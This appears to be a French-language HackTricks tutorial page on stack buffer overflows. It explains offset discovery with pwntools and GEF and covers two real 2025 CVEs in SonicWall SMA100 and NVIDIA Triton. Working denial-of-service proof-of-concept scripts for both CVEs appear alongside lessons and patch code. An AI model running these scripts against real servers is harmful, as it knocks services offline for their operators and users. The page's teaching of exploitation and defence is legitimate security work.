# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## Qu'est-ce qu'un Stack Overflow

Un **stack overflow** est une vulnérabilité qui se produit lorsqu'un programme écrit plus de données sur la pile qu'il n'est alloué pour en contenir. Ces données excédentaires vont **écraser l'espace mémoire adjacent**, entraînant la corruption de données valides, une perturbation du flux de contrôle, et potentiellement l'exécution de code malveillant. Ce problème survient souvent en raison de l'utilisation de fonctions non sécurisées qui ne vérifient pas les limites des entrées.

Le principal problème de cette écriture est que le **pointeur d'instruction sauvegardé (EIP/RIP)** et le **pointeur de base sauvegardé (EBP/RBP)** pour revenir à la fonction précédente sont **stockés sur la pile**. Par conséquent, un attaquant pourra écraser ceux-ci et **contrôler le flux d'exécution du programme**.

La vulnérabilité survient généralement parce qu'une fonction **copie dans la pile plus d'octets que la quantité qui lui est allouée**, permettant ainsi d'écraser d'autres parties de la pile.

Certaines fonctions courantes vulnérables à cela sont : **`strcpy`, `strcat`, `sprintf`, `gets`**... De plus, des fonctions comme **`fgets`**, **`read` & `memcpy`** qui prennent un **argument de longueur**, peuvent être utilisées de manière vulnérable si la longueur spécifiée est supérieure à celle allouée.

Par exemple, les fonctions suivantes pourraient être vulnérables :
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Trouver les offsets des débordements de pile

La manière la plus courante de trouver des débordements de pile est de donner une très grande entrée de `A`s (par exemple, `python3 -c 'print("A"*1000)'`) et de s'attendre à un `Segmentation Fault` indiquant que l'**adresse `0x41414141` a été tentée d'être accédée**.

De plus, une fois que vous avez trouvé qu'il y a une vulnérabilité de débordement de pile, vous devrez trouver l'offset jusqu'à ce qu'il soit possible de **surcharger l'adresse de retour**, pour cela, on utilise généralement une **séquence de De Bruijn.** Qui pour un alphabet donné de taille _k_ et des sous-séquences de longueur _n_ est une **séquence cyclique dans laquelle chaque sous-séquence possible de longueur _n_ apparaît exactement une fois** en tant que sous-séquence contiguë.

De cette manière, au lieu de devoir déterminer manuellement quel offset est nécessaire pour contrôler l'EIP, il est possible d'utiliser comme remplissage l'une de ces séquences et ensuite de trouver l'offset des octets qui ont fini par la surcharger.

Il est possible d'utiliser **pwntools** pour cela :
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
ou **GEF** :
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Exploiter les débordements de pile

Lors d'un débordement (en supposant que la taille du débordement soit suffisamment grande), vous pourrez **écraser** les valeurs des variables locales à l'intérieur de la pile jusqu'à atteindre le **EBP/RBP et EIP/RIP sauvegardés (ou même plus)**.\
La manière la plus courante d'abuser de ce type de vulnérabilité est de **modifier l'adresse de retour** afin que lorsque la fonction se termine, le **flux de contrôle soit redirigé vers l'endroit spécifié par l'utilisateur** dans ce pointeur.

Cependant, dans d'autres scénarios, il se peut que **l'écrasement de certaines valeurs de variables dans la pile** soit suffisant pour l'exploitation (comme dans des défis CTF faciles).

### Ret2win

Dans ce type de défis CTF, il y a une **fonction** **à l'intérieur** du binaire qui **n'est jamais appelée** et que **vous devez appeler pour gagner**. Pour ces défis, vous devez simplement trouver l'**offset pour écraser l'adresse de retour** et **trouver l'adresse de la fonction** à appeler (généralement [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) serait désactivé) afin que lorsque la fonction vulnérable retourne, la fonction cachée soit appelée :

{{#ref}}
ret2win/
{{#endref}}

### Shellcode de pile

Dans ce scénario, l'attaquant pourrait placer un shellcode dans la pile et abuser de l'EIP/RIP contrôlé pour sauter au shellcode et exécuter du code arbitraire :

{{#ref}}
stack-shellcode/
{{#endref}}

### Techniques ROP & Ret2...

Cette technique est le cadre fondamental pour contourner la principale protection de la technique précédente : **Pile non exécutable (NX)**. Et elle permet d'effectuer plusieurs autres techniques (ret2lib, ret2syscall...) qui finiront par exécuter des commandes arbitraires en abusant des instructions existantes dans le binaire :

{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Débordements de tas

Un débordement ne se produira pas toujours dans la pile, il pourrait également se produire dans le **tas**, par exemple :

{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Types de protections

Il existe plusieurs protections essayant de prévenir l'exploitation des vulnérabilités, consultez-les dans :

{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Exemple du monde réel : CVE-2025-40596 (SonicWall SMA100)

Une bonne démonstration de pourquoi **`sscanf` ne devrait jamais être considéré comme fiable pour analyser des entrées non fiables** est apparue en 2025 dans l'appareil SSL-VPN SMA100 de SonicWall. La routine vulnérable à l'intérieur de `/usr/src/EasyAccess/bin/httpd` tente d'extraire la version et le point de terminaison de toute URI qui commence par `/__api__/` :
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. La première conversion (`%2s`) stocke en toute sécurité **deux** octets dans `version` (par exemple, `"v1"`).
2. La deuxième conversion (`%s`) **n'a pas de spécificateur de longueur**, donc `sscanf` continuera à copier **jusqu'au premier octet NUL**.
3. Parce que `endpoint` est situé sur la **pile** et mesure **0x800 octets**, fournir un chemin plus long que 0x800 octets corrompt tout ce qui se trouve après le tampon ‑ y compris le **stack canary** et l'**adresse de retour sauvegardée**.

Une preuve de concept en une seule ligne suffit pour déclencher le crash **avant l'authentification** :
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
Bien que les stack canaries abortent le processus, un attaquant obtient toujours un **Denial-of-Service** primitive (et, avec des fuites d'informations supplémentaires, éventuellement une exécution de code). La leçon est simple :

* Toujours fournir une **largeur de champ maximale** (par exemple, `%511s`).
* Préférer des alternatives plus sûres telles que `snprintf`/`strncpy_s`.

### Exemple du monde réel : CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

Le serveur d'inférence Triton de NVIDIA (≤ v25.06) contenait plusieurs **débordements de pile** accessibles via son API HTTP. 
Le modèle vulnérable apparaissait de manière répétée dans `http_server.cc` et `sagemaker_server.cc` :
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) renvoie le **nombre de segments de tampon internes** qui composent le corps de la requête HTTP actuelle.
2. Chaque segment provoque l'allocation d'un **`evbuffer_iovec` de 16 octets** sur la **pile** via `alloca()` – **sans aucune limite supérieure**.
3. En abusant de **HTTP _chunked transfer-encoding_**, un client peut forcer la requête à être divisée en **des centaines de milliers de morceaux de 6 octets** (`"1\r\nA\r\n"`). Cela fait que `n` croît de manière illimitée jusqu'à ce que la pile soit épuisée.

#### Proof-of-Concept (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
Une requête d'environ 3 Mo suffit à écraser l'adresse de retour sauvegardée et **faire planter** le démon sur une version par défaut.

#### Patch & Mitigation
La version 25.07 remplace l'allocation de pile non sécurisée par un **`std::vector` soutenu par le tas** et gère gracieusement `std::bad_alloc`:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
Leçons apprises :
* Ne jamais appeler `alloca()` avec des tailles contrôlées par l'attaquant.
* Les requêtes en morceaux peuvent changer radicalement la forme des tampons côté serveur.
* Validez / limitez toute valeur dérivée de l'entrée du client *avant* de l'utiliser dans des allocations mémoire.

## Références
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)

{{#include ../../banners/hacktricks-training.md}}
